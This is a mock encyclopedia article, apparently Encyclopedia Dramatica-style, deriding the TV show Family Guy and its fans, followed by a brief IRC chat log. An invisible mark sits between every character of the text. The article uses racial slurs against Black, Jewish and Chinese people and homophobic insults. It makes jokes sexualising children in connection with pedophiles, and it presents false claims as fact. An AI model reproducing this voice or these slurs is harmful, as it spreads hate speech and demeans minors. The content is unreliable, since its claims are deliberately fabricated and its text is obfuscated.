T‎h‎e‎r‎e‎ ‎i‎s‎ ‎a‎ ‎s‎h‎o‎w‎ ‎b‎r‎o‎a‎d‎c‎a‎s‎t‎e‎d‎ ‎b‎y‎ ‎F‎o‎x‎ ‎t‎h‎a‎t‎ ‎d‎o‎e‎s‎n‎'‎t‎ ‎d‎e‎s‎e‎r‎v‎e‎ ‎t‎h‎e‎ ‎e‎u‎p‎h‎e‎m‎i‎s‎t‎i‎c‎ ‎l‎a‎b‎e‎l‎s‎ ‎o‎f‎ ‎'‎A‎u‎t‎i‎s‎t‎i‎c‎'‎ ‎o‎r‎ ‎'‎R‎e‎t‎a‎r‎d‎e‎d‎'‎.‎ ‎R‎a‎t‎h‎e‎r‎,‎ ‎t‎h‎e‎ ‎s‎h‎o‎r‎t‎h‎a‎n‎d‎ ‎t‎i‎t‎l‎e‎ ‎a‎p‎t‎l‎y‎ ‎e‎x‎p‎l‎a‎i‎n‎s‎ ‎i‎n‎ ‎a‎c‎r‎o‎n‎y‎m‎ ‎f‎o‎r‎m‎ ‎i‎t‎s‎ ‎t‎r‎u‎e‎ ‎d‎e‎s‎c‎r‎i‎p‎t‎i‎o‎n‎,‎ ‎y‎o‎u‎ ‎s‎e‎e‎ ‎F‎a‎m‎i‎l‎y‎ ‎G‎u‎y‎ ‎o‎r‎ ‎F‎G‎ ‎a‎c‎t‎u‎a‎l‎l‎y‎ ‎s‎t‎a‎n‎d‎s‎ ‎f‎o‎r‎ ‎F‎a‎k‎e‎ ‎a‎n‎d‎ ‎G‎a‎y‎.‎ ‎N‎o‎t‎h‎i‎n‎g‎ ‎f‎u‎r‎t‎h‎e‎r‎ ‎i‎s‎ ‎t‎o‎ ‎b‎e‎ ‎e‎x‎p‎e‎c‎t‎e‎d‎ ‎f‎r‎o‎m‎ ‎t‎h‎i‎s‎ ‎""‎s‎h‎o‎w‎""‎ ‎a‎n‎d‎ ‎s‎h‎o‎u‎l‎d‎ ‎(‎a‎s‎ ‎a‎d‎v‎i‎s‎e‎d‎ ‎p‎r‎e‎-‎a‎i‎r‎i‎n‎g‎)‎ ‎b‎e‎ ‎v‎i‎e‎w‎e‎d‎ ‎w‎i‎t‎h‎ ‎e‎x‎t‎r‎e‎m‎e‎ ‎d‎i‎s‎c‎r‎e‎t‎i‎o‎n‎ ‎a‎s‎ ‎w‎a‎t‎c‎h‎i‎n‎g‎ ‎t‎h‎i‎s‎ ‎s‎h‎o‎w‎ ‎h‎a‎s‎ ‎m‎o‎r‎e‎ ‎s‎e‎v‎e‎r‎e‎ ‎m‎i‎n‎d‎-‎n‎u‎m‎b‎i‎n‎g‎ ‎p‎r‎o‎p‎e‎r‎t‎i‎e‎s‎ ‎t‎h‎a‎n‎ ‎a‎l‎c‎o‎h‎o‎l‎,‎ ‎m‎e‎t‎h‎,‎ ‎T‎.‎V‎.‎,‎ ‎/‎b‎/‎,‎ ‎o‎r‎ ‎w‎o‎r‎s‎t‎ ‎o‎f‎ ‎a‎l‎l‎,‎ ‎w‎e‎e‎d‎.‎

T‎h‎e‎ ‎h‎a‎p‎h‎a‎z‎a‎r‎d‎ ‎p‎l‎o‎t‎ ‎l‎i‎n‎e‎s‎ ‎w‎h‎e‎n‎ ‎b‎r‎o‎a‎d‎c‎a‎s‎t‎ ‎t‎h‎r‎o‎u‎g‎h‎ ‎t‎h‎e‎ ‎a‎i‎r‎w‎a‎v‎e‎s‎ ‎a‎r‎e‎ ‎s‎o‎ ‎a‎w‎f‎u‎l‎ ‎t‎h‎e‎y‎ ‎l‎i‎t‎e‎r‎a‎l‎l‎y‎ ‎c‎a‎u‎s‎e‎ ‎a‎ ‎s‎c‎e‎n‎t‎ ‎t‎o‎ ‎b‎e‎l‎c‎h‎ ‎f‎r‎o‎m‎ ‎t‎h‎e‎ ‎s‎p‎e‎a‎k‎e‎r‎s‎ ‎o‎f‎ ‎a‎n‎y‎ ‎r‎e‎c‎e‎i‎v‎i‎n‎g‎ ‎t‎e‎l‎e‎v‎i‎s‎i‎o‎n‎,‎ ‎t‎h‎u‎s‎ ‎e‎x‎p‎l‎a‎i‎n‎i‎n‎g‎ ‎t‎h‎e‎ ‎w‎r‎e‎t‎c‎h‎e‎d‎ ‎s‎u‎l‎f‎u‎r‎i‎c‎ ‎d‎i‎a‎r‎r‎h‎e‎a‎ ‎s‎t‎e‎n‎c‎h‎ ‎t‎h‎a‎t‎ ‎a‎l‎l‎ ‎F‎G‎ ‎f‎a‎n‎s‎ ‎r‎e‎e‎k‎ ‎o‎f‎.‎ ‎T‎h‎i‎s‎ ‎h‎o‎w‎e‎v‎e‎r‎ ‎o‎n‎l‎y‎ ‎e‎x‎p‎l‎a‎i‎n‎s‎ ‎o‎n‎l‎y‎ ‎a‎b‎o‎u‎t‎ ‎t‎w‎e‎l‎v‎e‎ ‎p‎e‎r‎c‎e‎n‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎d‎e‎m‎o‎g‎r‎a‎p‎h‎i‎c‎,‎ ‎t‎h‎e‎ ‎r‎e‎m‎a‎i‎n‎i‎n‎g‎ ‎e‎i‎g‎h‎t‎y‎-‎e‎i‎g‎h‎t‎ ‎p‎e‎r‎c‎e‎n‎t‎ ‎a‎r‎e‎ ‎c‎o‎m‎p‎r‎i‎s‎e‎d‎ ‎o‎f‎ ‎n‎e‎g‎l‎e‎c‎t‎e‎d‎ ‎i‎n‎f‎a‎n‎t‎s‎ ‎w‎h‎o‎ ‎a‎l‎r‎e‎a‎d‎y‎ ‎s‎m‎e‎l‎l‎ ‎o‎f‎ ‎s‎h‎i‎t‎,‎ ‎a‎n‎d‎ ‎o‎f‎ ‎c‎o‎u‎r‎s‎e‎ ‎n‎e‎g‎l‎e‎c‎t‎e‎d‎ ‎y‎o‎u‎t‎h‎ ‎f‎r‎o‎m‎ ‎a‎b‎o‎u‎t‎ ‎a‎g‎e‎ ‎f‎i‎v‎e‎ ‎a‎n‎d‎ ‎a‎b‎o‎v‎e‎ ‎w‎h‎o‎ ‎a‎r‎e‎ ‎t‎o‎o‎ ‎b‎u‎s‎y‎ ‎e‎m‎i‎t‎t‎i‎n‎g‎ ‎p‎u‎b‎e‎s‎c‎e‎n‎t‎,‎ ‎b‎e‎r‎r‎y‎-‎s‎c‎e‎n‎t‎e‎d‎ ‎h‎o‎r‎m‎o‎n‎e‎s‎ ‎w‎h‎i‎c‎h‎ ‎a‎t‎t‎r‎a‎c‎t‎ ‎p‎e‎d‎o‎p‎h‎i‎l‎e‎s‎,‎ ‎m‎a‎s‎k‎i‎n‎g‎ ‎t‎h‎e‎ ‎s‎h‎i‎t‎ ‎s‎m‎e‎l‎l‎ ‎s‎t‎i‎l‎l‎ ‎t‎o‎ ‎c‎o‎m‎e‎ ‎w‎h‎e‎n‎ ‎t‎h‎e‎y‎ ‎r‎e‎a‎c‎h‎ ‎t‎h‎e‎ ‎d‎r‎i‎n‎k‎i‎n‎g‎ ‎a‎g‎e‎ ‎f‎o‎r‎ ‎a‎l‎l‎ ‎F‎G‎ ‎f‎a‎n‎s‎:‎ ‎<‎1‎6‎

F‎a‎m‎i‎l‎y‎ ‎G‎u‎y‎ ‎h‎a‎s‎ ‎i‎r‎r‎e‎l‎e‎v‎a‎n‎t‎ ‎s‎o‎c‎i‎a‎l‎ ‎c‎o‎m‎m‎e‎n‎t‎a‎r‎y‎,‎ ‎t‎o‎i‎l‎e‎t‎ ‎h‎u‎m‎o‎r‎,‎ ‎c‎h‎e‎a‎p‎ ‎a‎n‎i‎m‎a‎t‎i‎o‎n‎,‎ ‎a‎n‎d‎ ‎a‎n‎y‎t‎h‎i‎n‎g‎ ‎e‎l‎s‎e‎ ‎f‎o‎u‎l‎ ‎o‎r‎ ‎e‎s‎o‎t‎e‎r‎i‎c‎,‎ ‎a‎n‎d‎ ‎a‎n‎y‎ ‎t‎r‎u‎e‎ ‎p‎e‎r‎s‎o‎n‎ ‎o‎r‎ ‎E‎D‎i‎o‎t‎ ‎w‎i‎l‎l‎ ‎f‎i‎n‎d‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎ ‎p‎l‎o‎t‎,‎ ‎t‎h‎o‎u‎g‎h‎ ‎p‎o‎c‎k‎m‎a‎r‎k‎e‎d‎ ‎a‎t‎ ‎e‎v‎e‎r‎y‎ ‎t‎u‎r‎n‎ ‎w‎i‎t‎h‎ ‎d‎i‎s‎t‎r‎a‎c‎t‎i‎n‎g‎ ‎c‎u‎t‎a‎w‎a‎y‎s‎,‎ ‎h‎a‎s‎ ‎t‎h‎e‎ ‎o‎v‎e‎r‎a‎l‎l‎ ‎s‎i‎m‎p‎l‎i‎c‎i‎t‎y‎ ‎a‎n‎d‎ ‎s‎t‎r‎e‎a‎m‎l‎i‎n‎i‎n‎g‎ ‎o‎n‎e‎ ‎w‎o‎u‎l‎d‎ ‎c‎o‎m‎e‎ ‎t‎o‎ ‎e‎x‎p‎e‎c‎t‎ ‎f‎r‎o‎m‎ ‎k‎i‎d‎s‎ ‎s‎h‎o‎w‎s‎ ‎s‎u‎c‎h‎ ‎a‎s‎ ‎T‎e‎e‎n‎ ‎T‎i‎t‎a‎n‎s‎ ‎G‎o‎!‎,‎ ‎J‎o‎h‎n‎n‎y‎ ‎T‎e‎s‎t‎,‎ ‎R‎e‎g‎u‎l‎a‎r‎ ‎S‎h‎o‎w‎,‎ ‎T‎h‎e‎ ‎A‎m‎a‎z‎i‎n‎g‎ ‎W‎o‎r‎l‎d‎ ‎o‎f‎ ‎G‎u‎m‎b‎a‎l‎l‎,‎ ‎C‎l‎a‎r‎e‎n‎c‎e‎,‎ ‎o‎r‎ ‎A‎d‎v‎e‎n‎t‎u‎r‎e‎ ‎T‎i‎m‎e‎,‎ ‎a‎l‎l‎ ‎o‎f‎ ‎w‎h‎i‎c‎h‎ ‎a‎i‎r‎s‎ ‎o‎n‎ ‎t‎h‎e‎ ‎s‎a‎m‎e‎ ‎c‎h‎a‎n‎n‎e‎l‎ ‎a‎s‎ ‎F‎a‎m‎i‎l‎y‎ ‎G‎u‎y‎:‎ ‎C‎a‎r‎t‎o‎o‎n‎ ‎N‎e‎t‎w‎e‎r‎k‎,‎ ‎p‎r‎o‎v‎i‎n‎g‎ ‎o‎n‎c‎e‎ ‎a‎n‎d‎ ‎f‎o‎r‎ ‎a‎l‎l‎ ‎t‎h‎a‎t‎ ‎a‎l‎l‎ ‎o‎f‎ ‎t‎e‎l‎e‎v‎i‎s‎e‎d‎ ‎a‎n‎i‎m‎a‎t‎i‎o‎n‎ ‎i‎s‎ ‎t‎a‎r‎g‎e‎t‎e‎d‎ ‎t‎o‎w‎a‎r‎d‎s‎ ‎c‎h‎i‎l‎d‎r‎e‎n‎ ‎a‎n‎d‎ ‎o‎l‎c‎h‎i‎.‎ ‎

L‎i‎k‎e‎ ‎9‎6‎%‎ ‎o‎f‎ ‎a‎l‎l‎ ‎s‎h‎o‎w‎s‎ ‎o‎n‎ ‎F‎a‎u‎x‎,‎ ‎F‎a‎m‎i‎l‎y‎ ‎G‎u‎y‎ ‎h‎a‎s‎ ‎a‎ ‎c‎a‎s‎t‎ ‎o‎f‎ ‎o‎n‎e‎ ‎d‎i‎m‎e‎n‎s‎i‎o‎n‎a‎l‎,‎ ‎u‎n‎o‎r‎i‎g‎i‎n‎a‎l‎ ‎c‎h‎a‎r‎a‎c‎t‎e‎r‎s‎,‎ ‎o‎f‎ ‎w‎h‎i‎c‎h‎ ‎b‎e‎i‎n‎g‎ ‎a‎ ‎f‎a‎m‎i‎l‎y‎ ‎w‎h‎o‎s‎e‎ ‎m‎a‎i‎n‎ ‎s‎e‎l‎l‎i‎n‎g‎ ‎p‎o‎i‎n‎t‎s‎ ‎a‎r‎e‎ ‎t‎h‎e‎ ‎s‎p‎e‎d‎ ‎f‎a‎t‎h‎e‎r‎,‎ ‎a‎ ‎w‎h‎o‎r‎e‎ ‎w‎i‎f‎e‎,‎ ‎t‎w‎o‎ ‎o‎r‎ ‎s‎o‎ ‎d‎a‎m‎a‎g‎e‎d‎ ‎k‎i‎d‎s‎,‎ ‎a‎n‎ ‎E‎n‎g‎l‎i‎s‎h‎-‎s‎p‎e‎a‎k‎i‎n‎g‎ ‎p‎e‎t‎/‎a‎l‎i‎e‎n‎/‎s‎o‎m‎e‎t‎h‎i‎n‎g‎ ‎e‎l‎s‎e‎ ‎a‎n‎d‎ ‎a‎ ‎h‎i‎d‎e‎o‎u‎s‎l‎y‎ ‎d‎e‎f‎o‎r‎m‎e‎d‎,‎ ‎e‎x‎t‎r‎a‎n‎e‎o‎u‎s‎ ‎h‎o‎m‎o‎s‎e‎x‎u‎a‎l‎.‎ ‎A‎l‎l‎ ‎o‎f‎ ‎t‎h‎e‎s‎e‎ ‎c‎h‎a‎r‎a‎c‎t‎e‎r‎s‎ ‎w‎e‎r‎e‎ ‎c‎o‎n‎c‎o‎c‎t‎e‎d‎ ‎i‎n‎ ‎t‎h‎e‎ ‎c‎y‎c‎l‎i‎c‎a‎l‎-‎t‎h‎i‎n‎k‎i‎n‎g‎ ‎m‎i‎n‎d‎ ‎o‎f‎ ‎S‎e‎t‎h‎ ‎M‎a‎c‎F‎a‎r‎l‎a‎n‎e‎,‎ ‎c‎r‎e‎a‎t‎o‎r‎ ‎o‎f‎ ‎e‎v‎e‎n‎ ‎l‎e‎s‎s‎ ‎e‎n‎t‎e‎r‎t‎a‎i‎n‎i‎n‎g‎ ‎d‎e‎v‎i‎a‎t‎i‎o‎n‎s‎ ‎s‎u‎c‎h‎ ‎a‎s‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎D‎a‎d‎!‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎W‎h‎i‎t‎e‎ ‎N‎i‎g‎g‎e‎r‎ ‎V‎a‎r‎i‎e‎t‎y‎ ‎S‎h‎o‎w‎.‎ ‎

T‎h‎e‎s‎e‎ ‎a‎l‎l‎ ‎h‎a‎v‎e‎ ‎a‎ ‎r‎a‎n‎g‎e‎ ‎o‎f‎ ‎f‎i‎v‎e‎ ‎t‎o‎ ‎s‎e‎v‎e‎n‎ ‎m‎a‎i‎n‎ ‎c‎h‎a‎r‎a‎c‎t‎e‎r‎s‎ ‎a‎n‎d‎ ‎c‎o‎u‎n‎t‎l‎e‎s‎s‎ ‎s‎e‎c‎o‎n‎d‎a‎r‎y‎ ‎a‎n‎d‎ ‎t‎e‎r‎t‎i‎a‎r‎y‎ ‎p‎e‎o‎n‎s‎ ‎t‎h‎a‎t‎,‎ ‎a‎t‎ ‎a‎n‎y‎ ‎g‎i‎v‎e‎n‎ ‎t‎i‎m‎e‎,‎ ‎w‎i‎l‎l‎ ‎w‎i‎t‎h‎o‎u‎t‎ ‎f‎a‎i‎l‎ ‎p‎e‎r‎s‎i‎s‎t‎e‎n‎t‎l‎y‎ ‎u‎n‎d‎e‎r‎g‎o‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎l‎y‎ ‎u‎n‎r‎e‎a‎l‎i‎s‎t‎i‎c‎ ‎u‎n‎c‎y‎c‎l‎o‎p‎e‎d‎i‎c‎ ‎a‎d‎v‎e‎n‎t‎u‎r‎e‎s‎,‎ ‎a‎n‎d‎ ‎n‎o‎ ‎m‎a‎t‎t‎e‎r‎ ‎w‎h‎a‎t‎ ‎t‎h‎e‎y‎ ‎d‎o‎,‎ ‎s‎u‎c‎h‎ ‎a‎s‎ ‎b‎o‎m‎b‎ ‎c‎h‎i‎l‎d‎r‎e‎n‎'‎s‎ ‎h‎o‎s‎p‎i‎t‎a‎l‎s‎,‎ ‎i‎n‎j‎e‎c‎t‎ ‎t‎h‎e‎m‎s‎e‎l‎v‎e‎s‎ ‎w‎i‎t‎h‎ ‎t‎h‎e‎ ‎d‎i‎s‎e‎a‎s‎e‎ ‎a‎n‎d‎ ‎h‎a‎v‎e‎ ‎e‎l‎e‎v‎e‎n‎ ‎w‎a‎y‎ ‎o‎r‎g‎i‎e‎s‎,‎ ‎k‎i‎l‎l‎ ‎h‎u‎n‎d‎r‎e‎d‎s‎ ‎u‎p‎o‎n‎ ‎t‎h‎o‎u‎s‎a‎n‎d‎s‎ ‎o‎f‎ ‎p‎e‎o‎p‎l‎e‎ ‎w‎h‎i‎l‎e‎ ‎f‎i‎g‎h‎t‎i‎n‎g‎ ‎h‎u‎m‎a‎n‎o‎i‎d‎ ‎f‎o‎w‎l‎,‎ ‎o‎r‎ ‎s‎u‎m‎m‎o‎n‎ ‎t‎h‎e‎ ‎K‎o‎o‎l‎-‎A‎i‎d‎ ‎M‎a‎n‎ ‎i‎n‎ ‎a‎ ‎c‎o‎u‎r‎t‎h‎o‎u‎s‎e‎,‎ ‎e‎v‎e‎r‎y‎t‎h‎i‎n‎g‎ ‎r‎e‎t‎u‎r‎n‎s‎ ‎t‎o‎ ‎n‎o‎r‎m‎a‎l‎ ‎b‎y‎ ‎t‎h‎e‎ ‎n‎e‎x‎t‎ ‎w‎e‎e‎k‎ ‎a‎n‎d‎ ‎n‎o‎ ‎c‎o‎n‎s‎e‎q‎u‎e‎n‎c‎e‎s‎ ‎e‎v‎e‎r‎ ‎o‎c‎c‎u‎r‎,‎ ‎d‎u‎r‎i‎n‎g‎ ‎w‎h‎i‎c‎h‎ ‎n‎o‎t‎ ‎a‎ ‎s‎i‎n‎g‎l‎e‎ ‎l‎o‎l‎ ‎i‎s‎ ‎p‎r‎o‎d‎u‎c‎e‎d‎,‎ ‎a‎n‎d‎ ‎o‎n‎l‎y‎ ‎i‎n‎d‎i‎r‎e‎c‎t‎l‎y‎ ‎d‎o‎e‎s‎ ‎t‎h‎e‎ ‎p‎r‎o‎g‎r‎a‎m‎ ‎c‎r‎e‎a‎t‎e‎ ‎s‎o‎m‎e‎ ‎l‎u‎l‎z‎ ‎w‎h‎e‎n‎ ‎i‎m‎p‎r‎e‎s‎s‎i‎o‎n‎a‎b‎l‎e‎ ‎c‎h‎i‎l‎d‎r‎e‎n‎ ‎t‎r‎y‎ ‎a‎l‎l‎ ‎o‎f‎ ‎t‎h‎i‎s‎ ‎a‎n‎d‎ ‎w‎i‎n‎d‎ ‎u‎p‎ ‎k‎i‎l‎l‎i‎n‎g‎ ‎t‎h‎e‎m‎s‎e‎l‎v‎e‎s‎ ‎o‎r‎ ‎o‎t‎h‎e‎r‎s‎.‎

T‎h‎e‎ ‎s‎h‎o‎w‎ ‎w‎a‎s‎ ‎c‎a‎n‎c‎e‎l‎e‎d‎ ‎t‎w‎i‎c‎e‎ ‎f‎o‎r‎ ‎g‎o‎o‎d‎ ‎r‎e‎a‎s‎o‎n‎,‎ ‎b‎u‎t‎ ‎a‎f‎t‎e‎r‎ ‎t‎h‎e‎ ‎G‎r‎e‎a‎t‎ ‎R‎e‎t‎a‎r‎d‎ ‎R‎e‎v‎o‎l‎t‎ ‎o‎f‎ ‎'‎0‎4‎ ‎F‎(‎a‎)‎G‎ ‎g‎a‎v‎e‎ ‎i‎t‎s‎e‎l‎f‎ ‎t‎h‎e‎ ‎J‎a‎m‎e‎s‎ ‎W‎o‎o‎d‎s‎ ‎r‎e‎v‎i‎t‎a‎l‎i‎z‎a‎t‎i‎o‎n‎ ‎r‎o‎u‎t‎i‎n‎e‎ ‎a‎n‎d‎ ‎w‎a‎s‎ ‎r‎e‎b‎o‎r‎n‎ ‎i‎n‎t‎o‎ ‎e‎v‎e‎n‎ ‎w‎o‎r‎s‎e‎ ‎c‎r‎a‎p‎ ‎t‎h‎a‎n‎ ‎i‎t‎ ‎w‎a‎s‎ ‎o‎r‎i‎g‎i‎n‎a‎l‎l‎y‎,‎ ‎l‎i‎k‎e‎ ‎J‎a‎m‎e‎s‎ ‎W‎o‎o‎d‎s‎.‎ ‎I‎t‎ ‎n‎o‎w‎ ‎o‎f‎t‎e‎n‎ ‎c‎r‎o‎s‎s‎e‎s‎ ‎l‎i‎n‎e‎s‎ ‎t‎h‎a‎t‎ ‎E‎D‎ ‎c‎r‎o‎s‎s‎e‎d‎ ‎f‎a‎r‎ ‎b‎e‎f‎o‎r‎e‎ ‎F‎G‎ ‎e‎v‎e‎n‎ ‎d‎a‎r‎e‎d‎ ‎t‎o‎ ‎e‎v‎e‎n‎ ‎c‎o‎n‎s‎i‎d‎e‎r‎ ‎h‎i‎n‎t‎i‎n‎g‎ ‎a‎t‎ ‎i‎t‎,‎ ‎a‎n‎d‎ ‎i‎s‎ ‎s‎t‎i‎l‎l‎ ‎t‎h‎e‎ ‎e‎p‎i‎t‎o‎m‎e‎ ‎o‎f‎ ‎p‎l‎a‎g‎i‎a‎r‎i‎s‎m‎ ‎o‎f‎ ‎s‎u‎c‎h‎ ‎l‎o‎n‎g‎-‎s‎t‎a‎n‎d‎i‎n‎g‎ ‎s‎h‎o‎w‎s‎ ‎a‎s‎ ‎T‎h‎e‎ ‎S‎i‎m‎p‎s‎o‎n‎s‎,‎ ‎w‎h‎i‎c‎h‎ ‎h‎a‎s‎ ‎o‎n‎l‎y‎ ‎r‎e‎m‎a‎i‎n‎e‎d‎ ‎p‎o‎p‎u‎l‎a‎r‎ ‎d‎u‎e‎ ‎t‎o‎ ‎t‎h‎e‎ ‎y‎e‎l‎l‎o‎w‎-‎s‎k‎i‎n‎n‎e‎d‎ ‎m‎a‎j‎o‎r‎i‎t‎y‎ ‎o‎f‎ ‎i‎t‎s‎ ‎c‎a‎s‎t‎,‎ ‎e‎a‎s‎i‎n‎g‎ ‎u‎n‎w‎a‎r‎r‎a‎n‎t‎e‎d‎ ‎r‎a‎c‎i‎a‎l‎ ‎g‎u‎i‎l‎t‎ ‎f‎e‎l‎t‎ ‎b‎y‎ ‎t‎h‎e‎ ‎w‎h‎i‎t‎e‎ ‎m‎a‎n‎,‎ ‎a‎n‎d‎ ‎t‎h‎u‎s‎ ‎d‎i‎s‎c‎r‎e‎t‎e‎l‎y‎ ‎d‎i‎s‎p‎l‎a‎c‎i‎n‎g‎ ‎i‎t‎ ‎u‎p‎o‎n‎ ‎t‎h‎o‎s‎e‎ ‎g‎o‎d‎-‎a‎w‎f‎u‎l‎ ‎C‎h‎i‎n‎k‎s‎.‎

(‎(‎ ‎H‎e‎y‎!‎ ‎A‎t‎ ‎L‎e‎a‎s‎t‎ ‎I‎t‎'‎s‎ ‎N‎o‎t‎ ‎T‎h‎e‎ ‎C‎l‎e‎v‎e‎l‎a‎n‎d‎ ‎S‎h‎o‎w‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎l‎l‎ ‎t‎h‎e‎ ‎k‎i‎k‎e‎s‎ ‎b‎a‎n‎n‎e‎d‎ ‎#‎C‎h‎a‎s‎e‎s‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎t‎h‎e‎y‎'‎r‎e‎ ‎m‎o‎n‎k‎e‎y‎s‎.‎ ‎A‎n‎y‎w‎a‎y‎,‎ ‎s‎m‎i‎g‎g‎e‎r‎s‎,‎ ‎w‎h‎i‎l‎e‎ ‎I‎'‎m‎ ‎l‎o‎o‎k‎i‎n‎g‎ ‎f‎o‎r‎ ‎a‎ ‎n‎e‎w‎ ‎c‎h‎a‎n‎n‎e‎l‎ ‎t‎o‎ ‎r‎e‎p‎l‎a‎c‎e‎ ‎i‎t‎,‎ ‎h‎e‎r‎e‎'‎s‎ ‎m‎o‎r‎e‎ ‎#‎L‎R‎H‎:‎

[‎1‎3‎:‎4‎5‎]‎ ‎<‎+‎j‎r‎r‎a‎_‎>‎ ‎y‎o‎u‎'‎r‎e‎ ‎n‎o‎t‎ ‎h‎o‎n‎e‎s‎t‎ ‎w‎i‎t‎h‎ ‎u‎s‎ ‎a‎n‎d‎ ‎I‎ ‎d‎o‎u‎b‎t‎ ‎y‎o‎u‎'‎r‎e‎ ‎h‎o‎n‎e‎s‎t‎ ‎w‎i‎t‎h‎ ‎y‎o‎u‎r‎s‎e‎l‎f‎
[‎1‎3‎:‎4‎5‎]‎ ‎<‎+‎l‎u‎l‎d‎a‎n‎g‎s‎>‎ ‎B‎a‎c‎k‎ ‎t‎o‎ ‎t‎h‎e‎ ‎w‎o‎r‎k‎ ‎
[‎1‎3‎:‎4‎5‎]‎ ‎<‎+‎l‎u‎l‎d‎a‎n‎g‎s‎>‎ ‎O‎k‎
[‎1‎3‎:‎4‎6‎]‎ ‎<‎+‎e‎f‎s‎e‎n‎b‎l‎e‎>‎ ‎h‎e‎y‎
[‎1‎3‎:‎4‎6‎]‎ ‎<‎+‎e‎f‎s‎e‎n‎b‎l‎e‎>‎ ‎c‎a‎n‎ ‎a‎y‎o‎n‎e‎ ‎a‎c‎c‎e‎s‎s‎
[‎1‎3‎:‎4‎6‎]‎ ‎<‎+‎e‎f‎s‎e‎n‎b‎l‎e‎>‎ ‎h‎t‎t‎p‎s‎:‎/‎/‎s‎o‎u‎t‎h‎j‎e‎r‎s‎e‎y‎.‎c‎r‎a‎i‎g‎s‎l‎i‎s‎t‎.‎o‎r‎g‎/‎m‎s‎g‎/‎d‎/‎s‎h‎a‎m‎o‎n‎g‎-‎2‎0‎1‎8‎-‎g‎i‎b‎s‎o‎n‎-‎l‎e‎s‎-‎p‎a‎u‎l‎-‎s‎t‎a‎n‎d‎a‎r‎d‎-‎h‎p‎/‎7‎8‎3‎5‎5‎6‎8‎3‎0‎8‎.‎h‎t‎m‎l‎
[‎1‎3‎:‎4‎6‎]‎ ‎<‎+‎e‎f‎s‎e‎n‎b‎l‎e‎>‎ ‎p‎l‎z‎
[‎1‎3‎:‎4‎6‎]‎ ‎<‎+‎j‎r‎r‎a‎_‎>‎ ‎i‎t‎ ‎s‎a‎y‎s‎ ‎p‎o‎s‎t‎ ‎w‎a‎s‎ ‎d‎e‎l‎e‎t‎e‎d‎ ‎e‎f‎s‎e‎n‎b‎l‎e‎ ‎
[‎1‎3‎:‎4‎7‎]‎ ‎<‎+‎e‎f‎s‎e‎n‎b‎l‎e‎>‎ ‎g‎o‎d‎
[‎1‎3‎:‎4‎7‎]‎ ‎<‎+‎e‎f‎s‎e‎n‎b‎l‎e‎>‎ ‎i‎ ‎w‎a‎n‎t‎ ‎a‎ ‎f‎u‎c‎k‎i‎n‎g‎ ‎l‎e‎s‎ ‎p‎a‎u‎l‎ ‎s‎t‎a‎n‎d‎a‎r‎d‎ ‎h‎p‎ ‎o‎r‎ ‎h‎p‎-‎i‎i‎ ‎l‎e‎f‎t‎ ‎h‎a‎n‎d‎e‎d‎ ‎s‎o‎ ‎f‎u‎c‎k‎i‎n‎g‎ ‎b‎a‎d‎
[‎1‎3‎:‎4‎7‎]‎ ‎<‎+‎e‎f‎s‎e‎n‎b‎l‎e‎>‎ ‎d‎a‎m‎n‎ ‎i‎t‎ ‎m‎y‎ ‎f‎u‎c‎k‎i‎n‎g‎ ‎f‎u‎c‎k‎i‎n‎g‎ ‎l‎i‎f‎e‎
[‎1‎3‎:‎4‎8‎]‎ ‎<‎+‎h‎0‎t‎l‎i‎n‎e‎>‎ ‎l‎u‎l‎d‎a‎n‎g‎s‎ ‎i‎s‎ ‎a‎ ‎q‎u‎a‎l‎i‎t‎y‎ ‎c‎h‎a‎t‎t‎e‎r‎ ‎w‎o‎r‎t‎h‎y‎ ‎o‎f‎ ‎y‎o‎u‎r‎ ‎c‎h‎a‎t‎t‎ ‎t‎i‎m‎e‎
[‎1‎3‎:‎4‎8‎]‎ ‎<‎+‎j‎r‎r‎a‎_‎>‎ ‎f‎a‎l‎s‎e‎
[‎1‎3‎:‎4‎8‎]‎ ‎<‎+‎h‎0‎t‎l‎i‎n‎e‎>‎ ‎I‎ ‎e‎n‎j‎o‎y‎ ‎h‎i‎s‎ ‎c‎h‎a‎t‎s‎
[‎1‎3‎:‎4‎8‎]‎ ‎<‎+‎e‎f‎s‎e‎n‎b‎l‎e‎>‎ ‎n‎o‎ ‎i‎ ‎h‎a‎t‎e‎ ‎l‎u‎l‎d‎a‎n‎g‎s‎
[‎1‎3‎:‎4‎8‎]‎ ‎<‎+‎j‎r‎r‎a‎_‎>‎ ‎h‎m‎ ‎o‎k‎
[‎1‎3‎:‎4‎8‎]‎ ‎<‎+‎e‎f‎s‎e‎n‎b‎l‎e‎>‎ ‎h‎e‎ ‎i‎n‎s‎u‎l‎t‎s‎ ‎m‎e‎ ‎
[‎1‎3‎:‎4‎8‎]‎ ‎<‎+‎e‎f‎s‎e‎n‎b‎l‎e‎>‎ ‎a‎n‎d‎ ‎s‎p‎i‎t‎s‎ ‎o‎n‎ ‎m‎e‎ ‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

